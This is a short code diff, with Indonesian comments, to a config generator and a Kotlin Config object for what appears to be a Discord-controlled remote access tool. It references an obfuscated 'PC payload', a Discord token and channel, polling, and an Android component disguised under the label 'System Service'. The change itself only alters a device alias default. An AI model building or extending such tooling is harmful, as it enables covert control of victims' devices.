@@ -4,7 +4,7 @@ Algoritmanya sama persis dengan core/_crypt.py di payload PC (SHA-256 counter
 stream + XOR + base64), dan dibaca di sisi Android oleh Vault.kt.
 
 Pakai:
-    python tools\\genconfig.py --token "<token>" --channel 123 --alias b
+    python tools\\genconfig.py --token "<token>" --channel 123
     python tools\\genconfig.py --uuid 7b05519d-... --poll 4
 """
 
@@ -33,7 +33,7 @@ object Config {
     val token: String get() = fields.getOrElse(0) { "" }
     val channel: String get() = fields.getOrElse(1) { "" }
     val uuid: String get() = fields.getOrElse(2) { "dev" }
-    val alias: String get() = fields.getOrElse(3) { "a" }
+    val alias: String get() = fields.getOrElse(3) { "" }
     val api: String get() = fields.getOrElse(4) { "https://discord.com/api/v10" }
     val label: String get() = fields.getOrElse(5) { "System Service" }
 
@@ -65,7 +65,9 @@ def main() -> int:
     ap.add_argument("--token", default="")
     ap.add_argument("--channel", default="")
     ap.add_argument("--uuid", default="")
-    ap.add_argument("--alias", default="b")
+    ap.add_argument("--alias", default="",
+                    help="nama pendek perangkat. kosong = otomatis dari "
+                         "codename (Build.DEVICE), mis. ginkgo -> gink")
     ap.add_argument("--api", default="https://discord.com/api/v10")
     ap.add_argument("--label", default="System Service")
     ap.add_argument("--poll", type=int, default=4000)
